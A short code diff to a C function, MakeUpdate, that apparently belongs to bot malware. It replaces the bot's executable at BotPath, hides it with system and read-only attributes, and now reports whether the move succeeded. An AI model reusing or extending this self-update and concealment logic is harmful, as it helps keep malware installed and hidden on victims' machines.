@@ -883,7 +883,7 @@ bool MakeUpdate(PCHAR FileName )
 
 	}
 
-	pMoveFileExA( FileName, BotPath, MOVEFILE_REPLACE_EXISTING );
+	bool Result = pMoveFileExA(FileName, BotPath, MOVEFILE_REPLACE_EXISTING ) != 0;
 	pSetFileAttributesA(BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
 
 
@@ -899,7 +899,7 @@ bool MakeUpdate(PCHAR FileName )
 
 	STR::Free(BotPath);
 
-	return true;
+	return Result;
 }
 
 DWORD GetFileHash( WCHAR *File )
